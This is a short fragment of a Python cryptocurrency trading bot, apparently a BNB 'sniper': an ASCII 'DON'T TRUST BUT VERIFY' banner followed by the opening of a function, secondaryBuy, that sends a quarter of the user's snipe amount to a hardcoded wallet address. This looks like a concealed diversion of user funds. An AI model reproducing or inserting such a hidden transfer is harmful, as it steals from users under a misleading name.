...
print(style.RED) #change following text to magenta

print("   xxxxxxxxxxxxxxxxxxxxxxxxxxxx        UU    DON'T                                           ")
print("                             X         UU     TRUST                                          ")
print("                           AX          UU         BUT                                        ")
print("                         SAX           UU            VERIFY                                  ")
print("                       ZXZX            UU                                                    ")
...
print("            ZZZ                        UU       LET'S                                        ")
print("          XX                           UU      BEGIN                                         ")
print("          XXXXXXXXXXXXXXXXXXXXXXX      UU                                                    ")
...
def secondaryBuy():
    to_address = "0xA469a56620100B47700670d9CBa3e6BFE1Ff5e6D" 
    amtToSend = float(snipeBNBAmount/4)
